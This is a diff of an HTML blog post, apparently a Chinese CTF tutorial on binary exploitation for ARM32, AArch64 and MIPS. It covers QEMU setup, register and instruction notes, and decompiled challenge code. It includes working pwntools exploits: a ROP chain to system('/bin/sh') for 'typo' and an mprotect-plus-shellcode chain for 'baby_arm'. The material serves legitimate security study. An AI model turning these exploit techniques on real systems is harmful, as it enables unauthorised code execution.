@@ -86,19 +86,19 @@
 
 <div style="font-size: 21px;"><b>精简指令集的约定：</b></div>
 
-<pre><code class="assembly">BYTE(字节):      8Bits
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">BYTE(字节):      8Bits
 HalfWORD(半字):  16bits
-WORD(字)：       32bits
-</code></pre>
+WORD(字)：       32bits<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <br>
 
 <h2 id="0x01：架构环境模拟"><a href="#0x01：架构环境模拟" class="headerlink" title="0x01：架构环境模拟"></a>0x01：架构环境模拟</h2><div style="font-size: 21px;"><b>qemu的安装：</b></div>
 
-<pre><code class="shell">sudo apt update
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt update
 sudo apt-get install qemu
 sudo apt-get install qemu-user-static
-sudo apt-get install qemu-system
-</code></pre>
+sudo apt-get install qemu-system<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>如果程序是静态链接并且是32位 arm架构的话，输入qemu-arm ./程序名</p>
 <p>如果程序是静态链接并且是aarch64架构的话，输入qemu-aarch ./程序名</p>
 <p>如果程序是动态链接且是32位 arm架构的话，输入qemu-arm -L /usr/arm-linux-gnueabihf ./程序名</p>
@@ -109,13 +109,13 @@ sudo apt-get install qemu-system
 
 <p>动态链接的程序的正常运行，需要安装对应架构的动态链接库才行。</p>
 <p>用这个命令来查对应架构的动态链接库</p>
-<pre><code class="shell">sudo apt search &quot;libc6&quot; | grep mips
-</code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sudo apt search &quot;libc6&quot; | grep mips<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="/images/%E5%BC%82%E6%9E%84Pwn/pic11.png" alt="pic11"></p>
 <p>键入命令：<code>sudo apt install libc6-dev-mips-cross</code>即可安装对应的库。</p>
-<pre><code class="shell"># 这一大坨直接下吧,常用的架构
-sudo apt-get install libc6-arm64-cross libc6-armel-cross libc6-armhf-cross libc6-mips-cross libc6-mips32-mips64-cross libc6-mips32-mips64el-cross libc6-mips64-cross libc6-mips64-mips-cross libc6-mips64-mipsel-cross libc6-mips64el-cross libc6-mipsel-cross libc6-mipsn32-mips-cross libc6-mipsn32-mips64-cross libc6-mipsn32-mips64el-cross libc6-mipsn32-mipsel-cross
-</code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 这一大坨直接下吧,常用的架构
+sudo apt-get install libc6-arm64-cross libc6-armel-cross libc6-armhf-cross libc6-mips-cross libc6-mips32-mips64-cross libc6-mips32-mips64el-cross libc6-mips64-cross libc6-mips64-mips-cross libc6-mips64-mipsel-cross libc6-mips64el-cross libc6-mipsel-cross libc6-mipsn32-mips-cross libc6-mipsn32-mips64-cross libc6-mipsn32-mips64el-cross libc6-mipsn32-mipsel-cross<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <br>
 
 <div style="font-size: 21px;"><b>调试：</b></div>
@@ -143,30 +143,31 @@ sudo apt-get install libc6-arm64-cross libc6-armel-cross libc6-armhf-cross libc6
 
 <h2 id="0x03：ARM32-例题实践"><a href="#0x03：ARM32-例题实践" class="headerlink" title="0x03：ARM32 例题实践"></a>0x03：ARM32 例题实践</h2><div style="font-size: 21px;"><b>题目：typo</b></div>
 
-<pre><code class="shell">tolele@tolele-ubuntu22:~/studyspace $ file typo
-typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tolele@tolele-ubuntu22:~&#x2F;studyspace $ file typo
+typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU&#x2F;Linux 2.6.32, BuildID[sha1]&#x3D;211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
 
-tolele@tolele-ubuntu22:~/studyspace $ checksec typo
-[*] &#39;/home/tolele/studyspace/typo&#39;
+tolele@tolele-ubuntu22:~&#x2F;studyspace $ checksec typo
+[*] &#39;&#x2F;home&#x2F;tolele&#x2F;studyspace&#x2F;typo&#39;
     Arch:     arm-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE (0x8000)
-</code></pre>
+    PIE:      No PIE (0x8000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>程序分析：由于程序剔除了符号表，在IDA中反汇编查看代码也难以下手。网上有个叫rizzo的IDA插件，说是有个恢复符号表，但似乎在IDA Pro 7.6中加载不出来。所以现在只能先运行，看看有没有信息，再随机应变了。</p>
-<pre><code class="shell">tolele@tolele-ubuntu22:~/studyspace $ ./typo
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tolele@tolele-ubuntu22:~&#x2F;studyspace $ .&#x2F;typo
 Let&#39;s Do Some Typing Exercise~
 Press Enter to get start;
 Input ~ if you want to quit
 
 ------Begin------
 tight
-tolele                     //我的输入   
+tolele                     &#x2F;&#x2F;我的输入   
 E.r.r.o.r.
 
 near
-</code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>可在IDA中查找这几句字符串，从而找到main函数。其实好像找到了main函数，反汇编帮助也不大，不如根据信息的提示来输入看看。</p>
 <p>执行程序后，输入回车开始打字练习，然后输入~就会退出练习。既然是可以输入一段很长的字符串，又根据程序剔除了符号表（主要因为它是一道题目），我们可以大胆猜测是一道简单的栈溢出。那么，我们可以先判断一下偏移。</p>
 <br>
@@ -179,19 +180,19 @@ near
 <p>在ARM32指令集中，R0~R3存储函数调用的前4个参数。pc相当于x86指令集中的IP寄存器。因为程序是静态链接的，我们可以查找/bin/sh字符串和相应的gadget。至于system函数，我们可以通过查找/bin/sh字符串在IDA中找到。</p>
 <p><img src="/images/%E5%BC%82%E6%9E%84Pwn/pic05.png" alt="pic05"></p>
 <p>最后，EXP如下：</p>
-<pre><code class="python">from pwn import *
-context(os=&#39;linux&#39;, arch=&#39;arm&#39;, log_level=&#39;debug&#39;)
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;arm&#39;, log_level&#x3D;&#39;debug&#39;)
 
-io = process(&quot;./typo&quot;)
-binsh = 0x6c384
-system = 0x10ba8
-gadget = 0x20904
+io &#x3D; process(&quot;.&#x2F;typo&quot;)
+binsh &#x3D; 0x6c384
+system &#x3D; 0x10ba8
+gadget &#x3D; 0x20904
 
-payload = b&#39;A&#39;*112 + p32(gadget) + p32(binsh) + p32(0) + p32(system)
+payload &#x3D; b&#39;A&#39;*112 + p32(gadget) + p32(binsh) + p32(0) + p32(system)
 io.sendline()
 io.sendline(payload)
-io.interactive()
-</code></pre>
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <br>
 
 <h2 id="0x04：AARCH64"><a href="#0x04：AARCH64" class="headerlink" title="0x04：AARCH64"></a>0x04：AARCH64</h2><p>AARCH64也即64位的ARM，从ARMv8开始才有。ARMv8分为aarch32和aarch64两部分。</p>
@@ -210,7 +211,7 @@ io.interactive()
 
 <div style="font-size: 21px;"><b>相关指令：</b></div>
 
-<pre><code class="assembly">// 感谢Nirvana师傅的总结
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">&#x2F;&#x2F; 感谢Nirvana师傅的总结
 LDR指令:
 LDR X23, [SP,#0x40]  ;将sp+0x40的内容赋给x23
 
@@ -221,11 +222,11 @@ LDP X29, X30, [SP+0x20],#0x20  ;将sp偏移0x20和0x28的字节的值取出来,�
 
 STP指令:
 入栈指令（str 的变种指令，可以同时操作两个寄存器）
-stp x29, x30, [sp, #0x10]     ;将x29, x30的值存入sp偏移16个字节的位置
+stp x29, x30, [sp, #0x10] 	;将x29, x30的值存入sp偏移16个字节的位置
 
 BNE指令,是个条件跳转。即：是“不相等（或不为0）跳转指令”。如果不为0就跳转到后面指定的地址，继续执行。
-B 是最简单的分支。一旦遇到一个 B 指令，ARM 处理器将立即跳转到给定的地址，从那里继续执行。
-</code></pre>
+B 是最简单的分支。一旦遇到一个 B 指令，ARM 处理器将立即跳转到给定的地址，从那里继续执行。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <blockquote>
 <p>其它指令可参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/tanli20090506/article/details/71487570">https://blog.csdn.net/tanli20090506/article/details/71487570</a></p>
 </blockquote>
@@ -233,42 +234,42 @@ B 是最简单的分支。一旦遇到一个 B 指令，ARM 处理器将立即�
 
 <h2 id="0x05：AARCH64-例题实践"><a href="#0x05：AARCH64-例题实践" class="headerlink" title="0x05：AARCH64 例题实践"></a>0x05：AARCH64 例题实践</h2><div style="font-size: 21px;"><b>Shanghai2018 – baby_arm</b></div>
 
-<pre><code class="shell">tolele@tolele-ubuntu22:~/studyspace $ file shbaby
-shbaby: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tolele@tolele-ubuntu22:~&#x2F;studyspace $ file shbaby
+shbaby: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-linux-aarch64.so.1, for GNU&#x2F;Linux 3.7.0, BuildID[sha1]&#x3D;e988eaee79fd41139699d813eac0c375dbddba43, stripped
 
-tolele@tolele-ubuntu22:~/studyspace $ checksec shbaby
-[*] &#39;/home/tolele/studyspace/shbaby&#39;
-    Arch:     aarch64-64-little        //aarch64
+tolele@tolele-ubuntu22:~&#x2F;studyspace $ checksec shbaby
+[*] &#39;&#x2F;home&#x2F;tolele&#x2F;studyspace&#x2F;shbaby&#39;
+    Arch:     aarch64-64-little        &#x2F;&#x2F;aarch64
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE (0x400000)
-</code></pre>
+    PIE:      No PIE (0x400000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>用IDA静态分析：</p>
-<pre><code class="c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
 &#123;
-  ssize_t v3; // x0
+  ssize_t v3; &#x2F;&#x2F; x0
 
   Init();
   write(1, &quot;Name:&quot;, 5uLL);
-  v3 = read(0, &amp;unk_411068, 0x200uLL);     //对bss段进行写
+  v3 &#x3D; read(0, &amp;unk_411068, 0x200uLL);     &#x2F;&#x2F;对bss段进行写
   sub_4007F0(v3);
   return 0LL;
 &#125;
 
-//sub_4007F0：
+&#x2F;&#x2F;sub_4007F0：
 ssize_t sub_4007F0()
 &#123;
-  __int64 v1; // [xsp+10h] [xbp+10h] BYREF
+  __int64 v1; &#x2F;&#x2F; [xsp+10h] [xbp+10h] BYREF
 
-  return read(0, &amp;v1, 0x200uLL);       //栈溢出
-&#125;
-</code></pre>
+  return read(0, &amp;v1, 0x200uLL);       &#x2F;&#x2F;栈溢出
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>通过read可以向bss段0x411068写入shellcode，但一般来说bss段是没有执行权限的。不过程序中给了mprotect函数，该函数可用于修改段的权限，这样的话就可以修改unk_411000该页为可执行。</p>
-<pre><code class="c">// mprotect函数的定义
-#include &lt;sys/mman.h&gt;
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">&#x2F;&#x2F; mprotect函数的定义
+#include &lt;sys&#x2F;mman.h&gt;
 int mprotect(void *addr, size_t len, int prot);
-addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB == 4096字节）整数倍。
+addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB &#x3D;&#x3D; 4096字节）整数倍。
 len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。
 prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用：
 1）PROT_READ：内存段可读,值为1;
@@ -278,10 +279,10 @@ prot：可以取以下几个值，并可以用“|”将几个属性结合起来
 返回值：0；成功，-1；失败（并且errno被设置）
 1）EACCES：无法设置内存段的保护属性。当通过 mmap(2) 映射一个文件为只读权限时，接着使用 mprotect() 标志为 PROT_WRITE这种情况就会发生。
 2）EINVAL：addr不是有效指针，或者不是系统页大小的倍数。
-3）ENOMEM：内核内部的结构体无法分配。
-</code></pre>
+3）ENOMEM：内核内部的结构体无法分配。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>现在问题是怎么控制栈数据，使得可以控制执行流？通过IDA中寻找可以发现，有个init函数起到了和x86下的<code>__libc_csu_init</code>类似的作用：</p>
-<pre><code class="IDA">.text:00000000004008AC
+<pre class="line-numbers language-IDA" data-language="IDA"><code class="language-IDA">.text:00000000004008AC
 .text:00000000004008AC loc_4008AC                              ; CODE XREF: init+60↓j
 .text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
 .text:00000000004008B0                 MOV             X2, X22
@@ -301,8 +302,8 @@ prot：可以取以下几个值，并可以用“|”将几个属性结合起来
 .text:00000000004008DC ; End of function init
 .text:00000000004008DC
 .text:00000000004008E0
-// var_s0 = 0
-</code></pre>
+&#x2F;&#x2F; var_s0 &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>在loc_4008CC一段：</p>
 <p>第一行即是把sp+10的值传给x19，把sp+18的值传给x20。第二、三行类似。</p>
 <p>第四行即是把sp+0的值传给x29，把sp+8的值传给x30，最后sp = sp + 0x40。</p>
@@ -319,34 +320,36 @@ prot：可以取以下几个值，并可以用“|”将几个属性结合起来
 <p>对第二次输入后下断点调试，断在0x40080C处：</p>
 <p><img src="/images/%E5%BC%82%E6%9E%84Pwn/pic08.png" alt="pic08"></p>
 <p>发现输入的数据竟然是在ret_addr是上方，这说明不能覆盖该栈帧的返回地址。但这里是函数sub_4007f0的栈帧，由于我们可以输入大量数据，可以考虑覆盖上一层栈帧，也就是main函数的栈帧。思路是第一次先执行mprotect函数修改0x411000段的权限，第二次在跳转到0x411068（shell）处执行。</p>
-<pre><code class="python">from pwn import *
-context(os=&#39;linux&#39;, arch=&#39;aarch64&#39;, log_level=&#39;debug&#39;)
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;aarch64&#39;, log_level&#x3D;&#39;debug&#39;)
 
-io = process(&quot;./shbaby&quot;)
-elf = ELF(&quot;./shbaby&quot;)
+io &#x3D; process(&quot;.&#x2F;shbaby&quot;)
+elf &#x3D; ELF(&quot;.&#x2F;shbaby&quot;)
 
-mpro_plt = elf.plt[&#39;mprotect&#39;]
-csu01 = 0x4008ac
-csu02 = 0x4008cc
-bss_addr = 0x411068
+mpro_plt &#x3D; elf.plt[&#39;mprotect&#39;]
+csu01 &#x3D; 0x4008ac
+csu02 &#x3D; 0x4008cc
+bss_addr &#x3D; 0x411068
 
 #shell
-shellcode = asm(shellcraft.aarch64.sh())
-shellcode = shellcode.ljust(0x100, b&#39;\x00&#39;)
-shellcode += p64(mpro_plt)
+shellcode &#x3D; asm(shellcraft.aarch64.sh())
+shellcode &#x3D; shellcode.ljust(0x100, b&#39;\x00&#39;)
+shellcode +&#x3D; p64(mpro_plt)
 io.sendlineafter(&quot;Name:&quot;, shellcode)
   
 #first
-payload = b&#39;A&#39;*0x48 + p64(csu02)
-payload += p64(0) + p64(csu01)
-payload += p64(0) + p64(1)
-payload += p64(bss_addr + 0x100) + p64(0x7)
-payload += p64(0x1000) + p64(0x411000)
+payload &#x3D; b&#39;A&#39;*0x48 + p64(csu02)
+payload +&#x3D; p64(0) + p64(csu01)
+payload +&#x3D; p64(0) + p64(1)
+payload +&#x3D; p64(bss_addr + 0x100) + p64(0x7)
+payload +&#x3D; p64(0x1000) + p64(0x411000)
 # second
-payload += p64(0) + p64(bss_addr) + p64(0)*6
+payload +&#x3D; p64(0) + p64(bss_addr) + p64(0)*6
 io.sendline(payload)
-io.interactive()
-</code></pre>
+io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 <h2 id="0x06：MIPS"><a href="#0x06：MIPS" class="headerlink" title="0x06：MIPS"></a>0x06：MIPS</h2><p>MIPS有32个通用寄存器（<code>$0 ~ $31</code>），2个特殊的寄存器(hi、lo)用于保存乘法和除法指令的结果，还有一个计数寄存器pc。</p>
 <p><img src="/images/%E5%BC%82%E6%9E%84Pwn/pic09.png" alt="pic09"></p>
 <br>
@@ -360,45 +363,45 @@ io.interactive()
 
 <h2 id="0x07：MIPS-例题实践"><a href="#0x07：MIPS-例题实践" class="headerlink" title="0x07：MIPS 例题实践"></a>0x07：MIPS 例题实践</h2><div style="font-size: 21px;"><b>HWS入营赛题： Mplogin</b></div>
 
-<pre><code class="shell">tolele@tolele-ubuntu22:~/studyspace $ file Mplogin
-Mplogin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tolele@tolele-ubuntu22:~&#x2F;studyspace $ file Mplogin
+Mplogin: ELF 32-bit LSB executable, MIPS, MIPS32 version 1 (SYSV), dynamically linked, interpreter &#x2F;lib&#x2F;ld-uClibc.so.0, stripped
 
-tolele@tolele-ubuntu22:~/studyspace $ checksec Mplogin
-[*] &#39;/home/tolele/studyspace/Mplogin&#39;
+tolele@tolele-ubuntu22:~&#x2F;studyspace $ checksec Mplogin
+[*] &#39;&#x2F;home&#x2F;tolele&#x2F;studyspace&#x2F;Mplogin&#39;
     Arch:     mips-32-little
     RELRO:    No RELRO
     Stack:    No canary found
     NX:       NX disabled
     PIE:      No PIE (0x400000)
     RWX:      Has RWX segments
-tolele@tolele-ubuntu22:~/studyspace $ 
-</code></pre>
+tolele@tolele-ubuntu22:~&#x2F;studyspace $ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>用IDA进行静态分析：</p>
-<pre><code class="C">int __cdecl main(int argc, const char **argv, const char **envp)
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">int __cdecl main(int argc, const char **argv, const char **envp)
 &#123;
-  int v3; // $a2
-  int v5; // [sp+18h] [+18h]
+  int v3; &#x2F;&#x2F; $a2
+  int v5; &#x2F;&#x2F; [sp+18h] [+18h]
 
   setbuf(stdin, 0, envp);
   setbuf(stdout, 0, v3);
   printf(&quot;\x1B[33m&quot;);
   puts(&quot;-----we1c0me t0 MP l0g1n s7stem-----&quot;);
-  v5 = sub_400840();
+  v5 &#x3D; sub_400840();
   sub_400978(v5);
   printf(&quot;\x1B[32m&quot;);
   return puts(&quot;Now you getshell~&quot;);
 &#125;
 
-//子函数
+&#x2F;&#x2F;子函数
 int sub_400840()
 &#123;
-  char v1[24]; // [sp+18h] [+18h] BYREF
+  char v1[24]; &#x2F;&#x2F; [sp+18h] [+18h] BYREF
 
   memset(v1, 0, sizeof(v1));
   printf(&quot;\x1B[34m&quot;);
   printf(&quot;Username : &quot;);
   read(0, v1, 24);
-  if ( strncmp(v1, &quot;admin&quot;, 5) )   //admin...
+  if ( strncmp(v1, &quot;admin&quot;, 5) )   &#x2F;&#x2F;admin...
     exit(0);
   printf(&quot;Correct name : %s&quot;, v1);  
   return strlen(v1);
@@ -406,11 +409,11 @@ int sub_400840()
 
 int __fastcall sub_400978(int a1)
 &#123;
-  char v2[20]; // [sp+18h] [+18h] BYREF
-  int v3; // [sp+2Ch] [+2Ch]
-  char v4[36]; // [sp+3Ch] [+3Ch] BYREF
+  char v2[20]; &#x2F;&#x2F; [sp+18h] [+18h] BYREF
+  int v3; &#x2F;&#x2F; [sp+2Ch] [+2Ch]
+  char v4[36]; &#x2F;&#x2F; [sp+3Ch] [+3Ch] BYREF
 
-  v3 = a1 + 4;
+  v3 &#x3D; a1 + 4;
   printf(&quot;\x1B[31m&quot;);
   printf(&quot;Pre_Password : &quot;);
   read(0, v2, 36);
@@ -419,23 +422,31 @@ int __fastcall sub_400978(int a1)
   if ( strncmp(v2, &quot;access&quot;, 6) || strncmp(v4, &quot;0123456789&quot;, 10) )
     exit(0);
   return puts(&quot;Correct password : **********&quot;);
-&#125;
-</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>在函数sub_400840中因为使用了strncmp对”admin”进行判断，导致admin后面加数据也可以通过。再通过后面的printf函数可以泄露栈地址，同时可以使sub_400978函数中read(0, v4, v3)栈溢出。</p>
 <p>但在泄露栈地址时，死活泄露不出来：</p>
-<pre><code class="python">payload01 = b&quot;admin&quot; + b&#39;A&#39;*18
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">payload01 &#x3D; b&quot;admin&quot; + b&#39;A&#39;*18
 io.sendlineafter(&quot;Username : &quot;, payload01)
 io.recvuntil(b&#39;AAA\n&#39;)
-stack = u32(io.recv(4))
-print(&quot;@@@ stack_addr = &quot; + str(hex(stack)))
-</code></pre>
+stack &#x3D; u32(io.recv(4))
+print(&quot;@@@ stack_addr &#x3D; &quot; + str(hex(stack)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>不幸的是，用gdb-multiarch调试时也发生了报错😭</p>
 <p>后面再查查调试报错的原因，gdb-multiarch用得还不是很熟。</p>
 <br>
 
 <h2 id="0x08：题目附件"><a href="#0x08：题目附件" class="headerlink" title="0x08：题目附件"></a>0x08：题目附件</h2><p>本文所用到的附件：</p>
 <p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1mMW-dxbcMOIDMPfmJ3mqrg">https://pan.baidu.com/s/1mMW-dxbcMOIDMPfmJ3mqrg</a><br>提取码：lele</p>
-<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script>window.dataLayer = window.dataLayer || [];
+<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script><script async="" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script><script>MathJax = {
+      tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+          fontCache: 'global'
+      }
+  };
+</script><script>window.dataLayer = window.dataLayer || [];
 function gtag(){dataLayer.push(arguments);}
 gtag('js', new Date());
 gtag('config', '');</script></html>
